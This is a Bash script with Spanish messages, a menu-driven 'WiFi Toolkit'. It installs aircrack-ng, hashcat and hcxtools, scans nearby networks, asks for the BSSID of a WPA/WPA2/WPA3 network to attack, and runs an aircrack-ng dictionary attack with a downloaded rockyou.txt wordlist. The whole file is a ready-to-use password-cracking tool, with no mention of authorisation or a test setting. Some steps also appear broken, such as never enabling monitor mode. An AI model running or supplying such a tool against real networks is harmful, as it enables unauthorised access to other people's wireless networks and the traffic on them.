#!/bin/bash

# Colores para salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "make" "gcc" "libpcap-dev" "zlib1g-dev")

# Función: Instalar dependencias
install_dependencies() {
    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 50
    sleep 2
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalación de Dependencia" --infobox "Instalando $dep..." 8 50
            if ! sudo apt-get install -y "$dep" &>/dev/null; then
                dialog --title "Error" --msgbox "No se pudo instalar $dep. Instálalo manualmente." 8 50
                exit 1
            fi
        fi
    done

    # Verificar e instalar hcxpcapngtool
    install_hcxpcapngtool
}

# Función: Instalar hcxpcapngtool
install_hcxpcapngtool() {
    if ! command -v hcxpcapngtool &>/dev/null; then
        dialog --title "Instalación Manual" --infobox "Instalando hcxpcapngtool desde el repositorio oficial..." 8 50
        sleep 2

        # Descargar y compilar hcxtools
        if [[ ! -d "$PROJECT_DIR/hcxtools" ]]; then
            git clone https://github.com/ZerBea/hcxtools.git "$PROJECT_DIR/hcxtools" &>/dev/null
            if [[ $? -ne 0 ]]; then
                dialog --title "Error" --msgbox "Error al clonar el repositorio hcxtools. Verifica tu conexión a Internet." 8 50
                exit 1
            fi
        fi

        cd "$PROJECT_DIR/hcxtools" || {
            dialog --title "Error" --msgbox "No se pudo acceder al directorio de hcxtools. Revisa la ruta." 8 50
            exit 1
        }

        # Resolver dependencias específicas
        sudo apt-get install -y libcurl4-openssl-dev libssl-dev &>/dev/null

        # Compilar y registrar errores si existen
        sudo make clean &>/dev/null
        if ! sudo make &>/tmp/hcxtools_make.log; then
            dialog --title "Error de Compilación" --msgbox "Ocurrió un error al compilar hcxtools. Revisa /tmp/hcxtools_make.log." 8 50
            exit 1
        fi

        # Instalar y verificar la instalación
        if ! sudo make install &>/tmp/hcxtools_install.log; then
            dialog --title "Error de Instalación" --msgbox "Error al instalar hcxtools. Revisa /tmp/hcxtools_install.log." 8 50
            exit 1
        fi

        cd - &>/dev/null || exit

        # Verificar si hcxpcapngtool está disponible
        if command -v hcxpcapngtool &>/dev/null; then
            dialog --title "Instalación Exitosa" --msgbox "hcxpcapngtool se instaló correctamente." 8 50
        else
            dialog --title "Error" --msgbox "hcxpcapngtool no se pudo instalar correctamente. Inténtalo manualmente." 8 50
            exit 1
        fi
    else
        dialog --title "Información" --msgbox "hcxpcapngtool ya está instalado en el sistema." 8 50
    fi
}

# Crear carpetas del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
}

# Escaneo en vivo de redes WiFi
live_scan_networks() {
    interface=$(detect_wireless_interface)
    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 50
    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" &
    sleep 10
    killall airodump-ng
    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
}

# Mostrar resultados del escaneo en vivo
show_scan_results() {
    local scan_file=$1
    if [[ -f "$scan_file" ]]; then
        dialog --title "Resultados del Escaneo" --textbox "$scan_file" 20 80
    else
        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 50
    fi
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Analizar redes WPA/WPA2/WPA3 y realizar ataque
analyze_and_attack_network() {
    local interface=$(detect_wireless_interface)
    dialog --title "Escaneo" --infobox "Escaneando redes WPA/WPA2/WPA3..." 8 50
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/wpa_scan" &
    sleep 10
    killall airodump-ng

    cap_file=$(find "$RESULTS_DIR" -type f -name "wpa_scan*.cap" | head -n 1)
    if [[ -z "$cap_file" ]]; then
        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap." 8 50
        return
    fi

    network=$(dialog --title "Seleccione una Red" --inputbox "Introduce el BSSID de la red que deseas atacar:" 10 50 3>&1 1>&2 2>&3)
    dictionary=$(find_or_download_dictionary)

    dialog --title "Ataque" --infobox "Iniciando ataque contra $network..." 8 50
    xterm -hold -e "aircrack-ng -w $dictionary -b $network $cap_file" &
}

# Buscar o descargar diccionario rockyou.txt
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 50
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escaneo en vivo de redes" \
            3 "Analizar redes WPA/WPA2/WPA3 y atacar" \
            4 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) live_scan_networks ;;
            3) analyze_and_attack_network ;;
            4) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 50 ;;
        esac
    done
}

# Inicio del script
prepare_project_directory
main_menu
